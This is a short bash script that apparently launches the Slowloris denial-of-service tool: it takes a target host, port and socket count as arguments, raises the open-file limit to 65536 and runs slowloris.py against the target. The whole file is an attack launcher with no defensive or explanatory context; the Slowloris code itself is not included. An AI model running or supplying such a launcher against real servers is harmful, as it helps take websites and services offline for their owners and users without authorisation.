#!/bin/bash

host=$1
port=$2
sockets=$3

ulimit -n 65536
python slowloris.py -i $host -p $port --max-sockets $sockets